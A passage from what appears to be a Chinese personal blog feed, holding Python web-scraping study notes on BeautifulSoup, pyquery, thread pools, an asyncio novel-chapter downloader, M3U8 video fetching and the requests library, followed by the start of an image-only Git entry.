srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210711160101787"></p><p><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711160846669.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711160846669.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210711160846669"></p><h1 id="Beautilful-Soup"><a href="#Beautilful-Soup" class="headerlink" title="Beautilful Soup"></a>Beautilful Soup</h1><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#初始化一个beautifsoup对象</span></span><br><span class="line"><span class="comment">#初始化beautifulsoup</span></span><br><span class="line">soup = BeautifulSoup(res.text,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"><span class="comment">#print(soup.prettify())</span></span><br><span class="line"><span class="comment">#打印title</span></span><br><span class="line"><span class="built_in">print</span>(soup.title.string)</span><br></pre></td></tr></table></figure><h2 id="节点选择器"><a href="#节点选择器" class="headerlink" title="节点选择器"></a>节点选择器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bs4.element.Tag</span><br><span class="line">其中bs4位一个beautifulsoup对象，element为一个标签，Tag为其中的属性如string/name</span><br></pre></td></tr></table></figure><h6 id="1-提取信息"><a href="#1-提取信息" class="headerlink" title="1.提取信息"></a>1.提取信息</h6><p><strong>名称</strong>：name获取当前dom的名称比如a、div、title</p><p><strong>属性</strong>：attrs的返回结果是字典形式</p><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711172255844.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711172255844.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210711172255844" style="zoom:50%;"><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711172244919.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711172244919.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210711172244919" style="zoom:50%;"><p><strong>内容</strong>：利用string属性获取节点内包含的文本内容</p><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711172340502.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711172340502.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210711172340502" style="zoom:50%;"><h6 id="2-嵌套选择"><a href="#2-嵌套选择" class="headerlink" title="2.嵌套选择"></a>2.嵌套选择</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">soup.head.title</span><br><span class="line">soup.head.title.string</span><br></pre></td></tr></table></figure><h6 id="3-关联选择"><a href="#3-关联选择" class="headerlink" title="3.关联选择"></a>3.关联选择</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#子和子孙节点</span></span><br><span class="line"><span class="comment">#直接子节点 调用contents属性 得到是世界子节点的列表，得不到孙子节点</span></span><br><span class="line">soup.element.contents</span><br><span class="line"><span class="comment">#调用children属性得到相应的结果</span></span><br><span class="line">soup.element.children</span><br><span class="line"><span class="comment">#获得所有子孙节点的，要调用descendants，descendants其中会进行的贵查询所有子节点，得到所有子孙节点</span></span><br><span class="line">soup.element.descendants</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#父亲和祖先节点</span></span><br><span class="line"><span class="comment">#获取某个节点元素的父节点 调用parent</span></span><br><span class="line">soup.element.parent</span><br><span class="line"><span class="comment">#获取所有的父亲节点 调用parents</span></span><br><span class="line">soup.element.parents</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#兄弟节点</span></span><br><span class="line">soup.element.next_siblings <span class="comment">#下一个</span></span><br><span class="line">soup.element.previous_siblings <span class="comment">#上一个</span></span><br></pre></td></tr></table></figure><h2 id="方法选择器"><a href="#方法选择器" class="headerlink" title="方法选择器"></a>方法选择器</h2><h6 id="1-find-all"><a href="#1-find-all" class="headerlink" title="1.find_all( )"></a>1.find_all( )</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">soup.find_all(name,attrs,recursive,text,**kwargs)</span><br></pre></td></tr></table></figure><p>其中可以使用的name以及attrs联合查询，比如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">li_list=soup.find_all(name=<span class="string">&quot;li&quot;</span>,attrs=<span class="string">&quot;rank-item&quot;</span>)</span><br></pre></td></tr></table></figure><p>其中找的是所有的为li的元素以及类中有属性rank-item</p><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711213556237.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711213556237.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210711213556237" style="zoom:50%;"><p>使用text参数就是匹配节点的文本，传入的形式可以是字符串或者正则表达式</p><h6 id="2-find"><a href="#2-find" class="headerlink" title="2.find( )"></a>2.find( )</h6><p>与上面差不多，find( )返回的是第一个元素</p><h2 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h2><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711214010817.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711214010817.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210711214010817" style="zoom: 67%;"><h1 id="使用pyquery"><a href="#使用pyquery" class="headerlink" title="使用pyquery"></a>使用pyquery</h1><p><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711215331775.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711215331775.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210711215331775"></p><h1 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h1><h1 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h1><h2 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h2><p>一次性开辟一些线程，我们用户直接给线程池提交任务，线程任务的调度交给线程池来完成</p><p><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210712201233247.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210712201233247.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210712201233247"></p><h2 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h2><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210712203135099.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210712203135099.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210712203135099" style="zoom:50%;"><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210712203317954.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210712203317954.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210712203317954" style="zoom:50%;"><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210712203552392.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210712203552392.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210712203552392" style="zoom:50%;"><p><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210712204138436.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210712204138436.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210712204138436"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">##异步的操作都需要用await 也就是阻塞声明</span></span><br><span class="line"><span class="comment">#拿到章节的url=http://dushu.baidu.com/api/pc/getCatalog?data=&#123;%22book_id%22:%224306063500%22&#125;</span></span><br><span class="line"><span class="comment">###协程爬取的注意事项</span></span><br><span class="line"><span class="comment">#1.必须创建一个任务集合 里面保存的是异步任务函数的调用 tasks[&#x27;xxx()&#x27;,xxx()]</span></span><br><span class="line"><span class="comment">#2.异步函数 必须用async声明 并且使用的使用需要用await进行阻塞</span></span><br><span class="line"><span class="keyword">import</span>  asyncio</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> aiofiles</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">download_chapter</span>(<span class="params">cid,cname</span>):</span></span><br><span class="line">    chapter_url=<span class="string">&quot;http://dushu.baidu.com/api/pc/getChapterContent?data=&#123;%22book_id%22:%224306063500%22,%22cid%22:%224306063500|&quot;</span>+cid+<span class="string">&quot;%22,%22need_bookinfo%22:1&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    chapter_url=re.sub(<span class="string">&quot;%22&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>,chapter_url)</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(url=chapter_url) <span class="keyword">as</span> result:</span><br><span class="line">            dic= <span class="keyword">await</span> result.json()</span><br><span class="line">            <span class="comment">#print(dic)</span></span><br><span class="line">            <span class="keyword">async</span> <span class="keyword">with</span> aiofiles.<span class="built_in">open</span>(<span class="string">f&quot;./novel/<span class="subst">&#123;cname&#125;</span>.txt&quot;</span>,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">await</span>  f.write(dic[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;novel&quot;</span>][<span class="string">&quot;content&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    form_url = <span class="string">&quot;http://dushu.baidu.com/api/pc/getCatalog?data=&#123;%22book_id%22:%224306063500%22&#125;&quot;</span></span><br><span class="line">    form_url = re.sub(<span class="string">&quot;%22&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, form_url)</span><br><span class="line">    result = requests.get(form_url)</span><br><span class="line">    tasks=[]<span class="comment">#这个为异步任务</span></span><br><span class="line">    <span class="keyword">for</span> it <span class="keyword">in</span> result.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;novel&quot;</span>][<span class="string">&quot;items&quot;</span>]:</span><br><span class="line">        tasks.append(download_chapter(it[<span class="string">&quot;cid&quot;</span>],it[<span class="string">&quot;title&quot;</span>]))</span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    asyncio.run(test())</span><br></pre></td></tr></table></figure><p>通过使用协程去爬取小说网站 其中需要注意的是包<code>aiohttp/aiofiles</code></p><p>结果：<img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210712233001890.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210712233001890.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210712233001890" style="zoom:50%;"></p><h1 id="视频抓取"><a href="#视频抓取" class="headerlink" title="视频抓取"></a>视频抓取</h1><h6 id="1-M3U8文件中的记录了所有的文件顺序"><a href="#1-M3U8文件中的记录了所有的文件顺序" class="headerlink" title="1.M3U8文件中的记录了所有的文件顺序"></a>1.M3U8文件中的记录了所有的文件顺序</h6><h6 id="2-通过M3U8下载ts文件"><a href="#2-通过M3U8下载ts文件" class="headerlink" title="2.通过M3U8下载ts文件"></a>2.通过M3U8下载ts文件</h6><h6 id="3-合并成mp4文件"><a href="#3-合并成mp4文件" class="headerlink" title="3.合并成mp4文件"></a>3.合并成mp4文件</h6><h1 id="SELENIUM"><a href="#SELENIUM" class="headerlink" title="SELENIUM"></a>SELENIUM</h1><h1 id="Request模块"><a href="#Request模块" class="headerlink" title="Request模块"></a>Request模块</h1><h2 id="使用url参数"><a href="#使用url参数" class="headerlink" title="使用url参数"></a>使用url参数</h2><p>使用的是dict</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dict</span>=&#123;&#125;</span><br><span class="line"><span class="built_in">dict</span>[<span class="string">&quot;name&quot;</span>]=<span class="string">&quot;xiaoming&quot;</span></span><br><span class="line"><span class="built_in">dict</span>[<span class="string">&quot;msg&quot;</span>]=<span class="string">&quot;hello&quot;</span></span><br><span class="line">res=requests.get(<span class="string">&quot;http://httpbin.org/get&quot;</span>,params=<span class="built_in">dict</span>)</span><br><span class="line"><span class="built_in">print</span>(res.url)</span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span>[<span class="string">&quot;msg&quot;</span>]=[<span class="string">&quot;hello1&quot;</span>,<span class="string">&quot;hello2&quot;</span>]</span><br><span class="line">res=requests.get(<span class="string">&quot;http://httpbin.org/get&quot;</span>,params=<span class="built_in">dict</span>)</span><br><span class="line"><span class="built_in">print</span>(res.url)</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210714004247005.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210714004247005.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210714004247005" style="zoom:50%;"><h2 id="response的返回内容"><a href="#response的返回内容" class="headerlink" title="response的返回内容"></a>response的返回内容</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">res=requests.get(<span class="string">&quot;http://httpbin.org/get&quot;</span>,params=&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xiaoming&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(res.text))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(res.content))</span><br><span class="line"><span class="built_in">print</span>(res.content)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(res.json()))</span><br><span class="line"><span class="built_in">print</span>(res.raw)</span><br><span class="line"><span class="comment">#要读出raw中，必须设置stream中为True</span></span><br><span class="line">res=requests.get(<span class="string">&quot;http://httpbin.org/get&quot;</span>,params=&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xiaoming&quot;</span>&#125;,stream=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(res.raw.read(<span class="number">10</span>))</span><br></pre></td></tr></table></figure><p><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210714005102227.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210714005102227.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210714005102227"></p><h2 id="response的状态码"><a href="#response的状态码" class="headerlink" title="response的状态码"></a>response的状态码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> HTTPError</span><br><span class="line">res=requests.get(<span class="string">&quot;http://httpbin.org/get&quot;</span>,params=&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xiaoming&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.status_code)</span><br><span class="line">res.raise_for_status()</span><br><span class="line"><span class="comment">#里面有存在一些校验码 200</span></span><br><span class="line"><span class="keyword">if</span> res.status_code==requests.codes.all_good:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line"><span class="comment">#使用其中的异常</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r_404= requests.get(<span class="string">&quot;http://httpbin.org/404&quot;</span>)</span><br><span class="line">   <span class="comment">#通过 Response.raise_for_status() 来抛出异常</span></span><br><span class="line">    r_404.raise_for_status()</span><br><span class="line"><span class="keyword">except</span> HTTPError <span class="keyword">as</span> r:</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Error&quot;</span>)</span><br></pre></td></tr></table></figure><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210714011026214.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210714011026214.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210714011026214" style="zoom:50%;">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Git使用</title>
      <link href="/2021/07/10/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/07/10/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/07/10/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E4%BD%BF%E7%94%A8/image-20210710133545864.png" class="lazyload" data-srcset="/2021/07/10/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E4%BD%BF%E7%94%A8/image-20210710133545864.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210710133545864"></p><img src="/2021/07/10/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E4%BD%BF%E7%94%A8/image-20210710134034104.png" class="lazyload" data-srcset="/2021/07/10/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E4%BD%BF%E7%94%A8/image-20210710134034104.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210710134034104" style="zoom:50%;"><p><img src="/2021/07/10/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E4%BD%BF%E7%94%A8/image-20210710140655362.png" class="lazyload" data-srcset="/2021/07/10/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E4%BD%BF%E7%94%A8/image-20210710140655362.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210710140655362"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数据库系统概论</title>
      <link href="/2021/06/30/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/"/>
      <url>/2021/06/30/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/</url>
      
